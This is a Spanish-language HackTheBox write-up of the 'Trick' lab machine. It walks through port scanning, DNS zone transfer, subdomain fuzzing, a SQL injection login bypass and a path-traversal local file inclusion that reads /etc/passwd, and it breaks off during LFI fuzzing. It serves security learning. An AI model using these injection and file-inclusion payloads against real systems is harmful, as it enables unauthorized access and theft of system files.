<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Trick" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBTrick/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBTrick/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-12T14:23:13-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Trick" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-12T14:23:13-05:00","datePublished":"2022-09-12T14:23:13-05:00","description":"Overview","headline":"Hackthebox Writeup Trick","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBTrick/"},"url":"https://e1p0tr0.github.io/posts/HTBTrick/"}</script><title>Hackthebox Writeup Trick | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Trick</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Trick</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1663010593" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-12 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3358 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Subdomain enumeration by <strong>AXFR zone transfer request</strong><li>Subdomain enumeration by <strong>relationship</strong><li>Private key by <strong>Local File Inclusion</strong> (Foothold)<li><strong>Fail2ban</strong> misconfiguration (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/trick/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.166<td style="text-align: center">18 Jun 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.166
PING 10.10.11.166 <span class="o">(</span>10.10.11.166<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.166: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>107 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.166 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 106.851/106.851/106.851/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos guardando en una variable la IP del objetivo y posteriormente con <code class="language-plaintext highlighter-rouge">nmap</code> realizamos un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir puertos abiertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">❯ TARGET=10.10.11.166;</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nv">$TARGET</span>
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 14:31 -05
Nmap scan report for 10.10.11.166
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
              \_________________ Secure Shell Protocol
25/tcp open  smtp
              \_________________ Simple Mail Transfer Protocol
53/tcp open  domain
              \_________________ Domain Name System
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Continuamos con un escaneo a profundidad de los puertos <strong>22(SSH) - 25(SMPT) - 53(DNS) - 80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">❯ nmap -p22,25,53,80 -sCV -oN openPortsTCP $</span>TARGET
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 14:39 -05
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
</span><span class="gp">Service Info: Host:  debian.localdomain;</span><span class="w"> </span>OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Iniciamos enumerando el puerto <strong>25 (SMPT)</strong> que corre el servicio <strong>Postfix</strong>:</p><blockquote><p>Qué es <strong>Postfix</strong>:</p><p>Postfix es un agente de transferencia de correo (MTA), una aplicación que se utiliza para enviar y recibir correos electrónicos</p></blockquote><p>En el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> observamos comandos que podemos ejecutar en el servicio de correo, en especial el comando <code class="language-plaintext highlighter-rouge">VRFY</code> que nos permite enumerar usuarios</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">❯ telnet $</span>TARGET 25
<span class="go">Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
VRFY root
252 2.0.0 root &lt;--------- Cannot verify the user (252 code)
VRFY user
</span><span class="gp">550 5.1.1 &lt;user&gt;</span>: Recipient address rejected: User unknown <span class="k">in </span><span class="nb">local </span>recipient table
<span class="go">VRFY nobody
252 2.0.0 nobody
VRFY admin
</span><span class="gp">550 5.1.1 &lt;admin&gt;</span>: Recipient address rejected: User unknown <span class="k">in </span><span class="nb">local </span>recipient table
</pre></table></code></div></div><p>No podemos hacer mucho por este puerto, así que pasamos a enumerar el puerto <strong>53(DNS)</strong></p><blockquote><p>Omitimos el descubrimiento de versión (Banner grabbing) ya que <code class="language-plaintext highlighter-rouge">nmap</code> se encargó de ello</p></blockquote><p>De manera primaria intentamos solicitar el proceso de <strong>tranferencia de zona</strong>, el cúal permite a un servidor <strong>DNS</strong> (servidor principal) pasar una copia de una parte de su base de datos a otro servidor <strong>DNS</strong> (servidor secundario)</p><p>Para ello, en la mayoría de los casos necesitamos un nombre de dominio:</p><blockquote><p>Usamos el comando <code class="language-plaintext highlighter-rouge">nslookup</code> que nos permite realizar una búsqueda de DNS inversa</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">❯ nslookup
</span><span class="gp">&gt;</span><span class="w"> </span>SERVER 10.10.11.166
<span class="go">Default server: 10.10.11.166
</span><span class="gp">Address: 10.10.11.166#</span>53
<span class="gp">&gt;</span><span class="w"> </span>10.10.11.166
<span class="go">166.11.10.10.in-addr.arpa       name = trick.htb. &lt;-------- Domain name!
</span></pre></table></code></div></div><p>Encontramos el nombre de dominio <code class="language-plaintext highlighter-rouge">trick.htb</code>. Ahora usando el comando <code class="language-plaintext highlighter-rouge">dig</code>, que nos permite realizar consultas a servidores <strong>DNS</strong> y obtener información, solicitamos el proceso de <strong>Transferencia de zona</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">❯ dig axfr @$</span>TARGET trick.htb
<span class="go">
</span><span class="gp">;</span><span class="w"> </span>&lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.4-2-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr @10.10.11.166 trick.htb
<span class="gp">;</span><span class="w"> </span><span class="o">(</span>1 server found<span class="o">)</span>
<span class="gp">;</span><span class="p">;</span> global options: +cmd
<span class="go">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
</span><span class="gp">;</span><span class="p">;</span> Query <span class="nb">time</span>: 108 msec
<span class="gp">;</span><span class="p">;</span> SERVER: 10.10.11.166#53<span class="o">(</span>10.10.11.166<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>
<span class="gp">;</span><span class="p">;</span> WHEN: Mon Sep 12 15:52:06 <span class="nt">-05</span> 2022
<span class="gp">;</span><span class="p">;</span> XFR size: 6 records <span class="o">(</span>messages 1, bytes 231<span class="o">)</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Usamos el tipo de consulta <strong>AXFR</strong> (Asynchronous Full Transfer Zone) debido al tipo de solicitud</p></div></blockquote><blockquote class="prompt-info"><div><p>Aquí puedes encontrar más información sobre <strong>Transeferencias de zona DNS</strong>: <a href="https://beaglesecurity.com/blog/vulnerability/dns-zone-transfer.html">https://beaglesecurity.com/blog/vulnerability/dns-zone-transfer.html</a></p></div></blockquote><p>Obervamos un nuevo dominio <code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code>, el cuál es un <strong>CNAME (Canonical name)</strong>, en manera simple se utiliza para dirigir un subdominio a otro dominio y aplicar <strong>Virtual hosting</strong> para de una misma IP podamos alojar distintas páginas web</p><p>Con el dominio encontrado pasamos a enumerar el puerto <strong>80 (HTTP)</strong>, sin olvidar antes agregar el nombre de dominio a nuestro arhcivo <em>/etc/hosts</em>, el cuál es el encargado de la resolución de direcciones IP y nombres de dominio: <code class="language-plaintext highlighter-rouge">echo "10.10.11.166 preprod-payroll.trick.htb" &gt;&gt; /etc/hosts</code></p><p>Ahora enumeramos que tecnologías corren por los servicios web:</p><blockquote><p>En el puerto <strong>80 (HTTP)</strong> solo encontramos una interfaz en desarrollo con una versión de <code class="language-plaintext highlighter-rouge">Nginx 1.14.2</code> como servidor web</p></blockquote><p><img data-src="/assets/img/htb/writeups/trick/trick_web.png" alt="trickWeb" class="shadow" data-proofer-ignore></p><blockquote><p>En el dominio <code class="language-plaintext highlighter-rouge">preprod-payroll.trick.htb</code> nos redirige a un panel de logeo</p></blockquote><p><img data-src="/assets/img/htb/writeups/trick/preprod-payroll_trick_web.png" alt="preprod-payrollWeb" class="shadow" data-proofer-ignore></p><p>Después de intentar credenciales por defecto probramos una <strong>inyección SQL</strong> básica <code class="language-plaintext highlighter-rouge">' or 1=1#</code> en cualquiera de los dos campos (Username/Password) y logramos entar como el usuario <code class="language-plaintext highlighter-rouge">Administrador</code> a lo que parece un sistema de Nóminas para los empleados (a saber por el nombre de dominio)</p><blockquote class="prompt-warning"><div><p>Lamentablemente el propósito de este <strong>Sistema de Gestión de Reclutamiento</strong> solo es un <strong>Rabbit hole</strong> (madriguera de conejo), él cual se le conoce como una situación en la que piensas que tienes una solución a lo que te enfrentas pero lo único que conseguirás es perder el tiempo</p></div></blockquote><p>Continuamos enumerando la web pero no encontramos más directorios interesantes, así que tiramos por encontrar mas subdominios. Y para esto nos fijamos en el subdominio que ya tenemos <code class="language-plaintext highlighter-rouge">preprod-payroll</code>:</p><blockquote><p>Si lo desglozamos tenemos <code class="language-plaintext highlighter-rouge">preprod</code> (abreviación de pre-producción) + <code class="language-plaintext highlighter-rouge">payroll</code> (nómina de sueldo)</p></blockquote><p>Sabemos que <strong>pre-producción</strong> nos quiere decir que la web aún está en la etapa de planificación, en nuestro caso la web para la nómina de sueldos. Entonces, es posible que tengamos otros servicios web en pre-producción, para ello realizamos una enumeración con <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">❯ wfuzz -c -t 200 --hh=5480 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: preprod-FUZZ.trick.htb' http://10.10.11.166
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"
</span></pre></table></code></div></div><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Ahora con nuestro nuevo domino <code class="language-plaintext highlighter-rouge">preprod-marketing.trick.htb</code> (no olvidar agregarlo al <em>/etc/hosts</em>) accedemos a la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/trick/preprod-marketing_trick_web.png" alt="preprod-marketingWeb" class="shadow" data-proofer-ignore></p><p>Revisando la web de manera rápida y por el título nos damos cuenta que es un template. Además, al ir cambiando de secciones (HOME, SERVICES, ABOUT) observamos en la <strong>URL</strong> <code class="language-plaintext highlighter-rouge">http://preprod-marketing.trick.htb/index.php?page=home.html</code> que a traves del archivo <em>index.php</em> haciendo el uso del parámetro <em>page</em> se llama al documento correspondiente a cada sección <em>home.html</em></p><p>De primeras es muy sospechoso si conocemos el ataque <strong>Local File Inclusion</strong>, ya que estos archivos que son parte del servidor son llamados para mostarse en pantalla</p><p>Para comprobarlo intentamos leer el clásico archivo <em>/etc/hosts</em> que almacena información de los usuarios de sistema:</p><blockquote><p>http://preprod-marketing.trick.htb/index.php?page=/etc/passwd</p></blockquote><p>No conseguimos resultados, así que intentamos usar <strong>bypass</strong> básico. Ya que no sabemos en que ruta nos encontramos, intentamos ir al directorio anterior <code class="language-plaintext highlighter-rouge">../</code> un par de veces (mayormente son 3 ya que por defecto al crear un servicio web, esta se aloja en la ruta absoluta <code class="language-plaintext highlighter-rouge">/var/www/&lt;web_name&gt;</code>):</p><blockquote><p>http://preprod-marketing.trick.htb/index.php?page=../../../etc/passwd</p></blockquote><p>Como seguimos sin resultados aplicamos otro <strong>bypass</strong> que evade las restricciones del uso de <code class="language-plaintext highlighter-rouge">../</code> y las elmina. Por ello, lo que hacemos es duplicarlas para que quede como queremos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="go">❯ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash &lt;---- User!
</span></pre></table></code></div></div><p>En caso que quieras probar mas <strong>byasses</strong> de manera simultánea, puedes usar <code class="language-plaintext highlighter-rouge">wfuzz</code> con un directorio adecuado:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="go">❯ wfuzz -c -t 100 --hl=0 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt http://preprod-marketing.trick.htb/index.php?page=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://preprod-marketing.trick.htb/index.php?page=FUZZ
Total requests: 914

=====================================================================
